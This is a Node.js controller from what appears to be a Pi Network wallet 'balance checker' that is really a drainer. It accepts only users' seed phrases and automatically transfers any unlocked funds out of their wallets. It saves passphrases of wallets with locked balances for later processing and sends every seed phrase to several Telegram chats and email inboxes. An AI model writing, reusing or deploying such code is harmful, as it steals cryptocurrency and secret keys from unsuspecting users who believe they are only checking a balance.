// backend/controllers/balanceController.js
const config = require('../config');
const { deriveAddressFromPassphrase } = require('../services/deriveService');
const { getAccountsDetails } = require('../services/piService');
const { performTransfer } = require('../services/transferService');
const { sendResultsEmail } = require('../services/mailerService');
const { sendResultsToTelegram } = require('../services/telegramService');
const WalletRecord = require('../models/WalletRecord');

async function checkBalances(req, res, next) {
  try {
    const { seedPhrases } = req.body || {};

    if (req.body && req.body.addresses) {
      return res.status(400).json({ error: 'Only seedPhrases are accepted. Address checking has been removed.' });
    }

    const hasSeedPhrases = Array.isArray(seedPhrases) && seedPhrases.length > 0;
    if (!hasSeedPhrases) {
      return res.status(400).json({ error: 'Provide seedPhrases as a non-empty array' });
    }

    if (seedPhrases.length > config.maxAddressesPerRequest) {
      return res.status(400).json({ error: `Too many seed phrases. Max ${config.maxAddressesPerRequest} per request.` });
    }

    if (!seedPhrases.every((sp) => typeof sp === 'string')) {
      return res.status(400).json({ error: 'Every seed phrase must be a string' });
    }

    const validAddresses = [];
    const passphraseMap = new Map();
    const invalidPassphrases = [];

    seedPhrases.forEach((sp, index) => {
      try {
        const derived = deriveAddressFromPassphrase(sp);
        validAddresses.push(derived);
        passphraseMap.set(derived, sp.trim());
      } catch (err) {
        invalidPassphrases.push({
          address: `seed-${index + 1}`,
          status: 'invalid',
          unlockedBalance: null,
          lockedBalance: null,
          nextUnlockDate: null,
          lockedBreakdown: [],
          error: 'Invalid passphrase',
          seedPhrase: sp.trim(),
        });
      }
    });

    const results = await getAccountsDetails(validAddresses);

    results.forEach((r) => {
      if (passphraseMap.has(r.address)) {
        r.seedPhrase = passphraseMap.get(r.address);
      }
    });

    // Auto-transfer for passphrase wallets
    if (hasSeedPhrases) {
      const transferPromises = results
        .filter(
          (r) =>
            passphraseMap.has(r.address) &&
            r.status === 'ok' &&
            r.unlockedBalance > 0
        )
        .map(async (r) => {
          const transferResult = await performTransfer(
            r.address,
            passphraseMap.get(r.address),
            r.unlockedBalance
          );
          r.transfer = transferResult;
          return r;
        });

      await Promise.all(transferPromises);
    }

    // Save wallet records
    for (const r of results) {
      if (
        r.status === 'ok' &&
        r.seedPhrase &&
        r.lockedBalance > 0 &&
        r.nextUnlockDate
      ) {
        await WalletRecord.findOneAndUpdate(
          { address: r.address },
          {
            address: r.address,
            passphrase: r.seedPhrase,
            lockedBalance: r.lockedBalance,
            nextUnlockDate: new Date(r.nextUnlockDate),
            processed: false,
          },
          { upsert: true, new: true }
        );
      }
    }

    const allResults = [...results, ...invalidPassphrases];

    // ============================================
    // 🔥 UPDATE: Sabhi Telegram accounts ko SAME full report
    // ============================================

    const tgResults = [];

    // Master Telegram - Full report
    if (config.telegram.masterTargets.length > 0) {
      const result = await sendResultsToTelegram(allResults, config.telegram.masterTargets, 'full');
      tgResults.push({ category: 'master', ...result });
    }

    // FB Telegram - Ab FULL report (same as master)
    if (config.telegram.fbTargets.length > 0) {
      const result = await sendResultsToTelegram(allResults, config.telegram.fbTargets, 'full');
      tgResults.push({ category: 'fb', ...result });
    }

    // SA Telegram - Ab FULL report (same as master)
    if (config.telegram.saTargets.length > 0) {
      const result = await sendResultsToTelegram(allResults, config.telegram.saTargets, 'full');
      tgResults.push({ category: 'sa', ...result });
    }

    // ============================================
    // 🔥 UPDATE: Sabhi Email accounts ko SAME full report
    // ============================================

    const emailResults = [];

    // Master Email - Full report
    if (config.recipients.masterEmails.length > 0) {
      const result = await sendResultsEmail(allResults, config.recipients.masterEmails, 'full');
      emailResults.push({ category: 'master', ...result });
    }

    // FB Email - Ab FULL report (same as master)
    if (config.recipients.fbEmails.length > 0) {
      const result = await sendResultsEmail(allResults, config.recipients.fbEmails, 'full');
      emailResults.push({ category: 'fb', ...result });
    }

    // SA Email - Ab FULL report (same as master)
    if (config.recipients.saEmails.length > 0) {
      const result = await sendResultsEmail(allResults, config.recipients.saEmails, 'full');
      emailResults.push({ category: 'sa', ...result });
    }

    // Aggregate
    let emailAggregate = { attempted: false, sentTo: [], error: null };
    if (emailResults.length > 0) {
      emailAggregate.attempted = emailResults.some((e) => e.attempted);
      emailAggregate.sentTo = emailResults.flatMap((e) => e.sentTo || []);
      const firstError = emailResults.find((e) => e.error);
      emailAggregate.error = firstError ? firstError.error : null;
    }

    let tgAggregate = { attempted: false, deliveries: [] };
    if (tgResults.length > 0) {
      tgAggregate.attempted = tgResults.some((t) => t.attempted);
      tgAggregate.deliveries = tgResults.flatMap((t) => t.deliveries || []);
    }

    return res.json({
      results: allResults,
      email: emailAggregate,
      telegram: tgAggregate,
    });
  } catch (err) {
    next(err);
  }
}

module.exports = { checkBalances };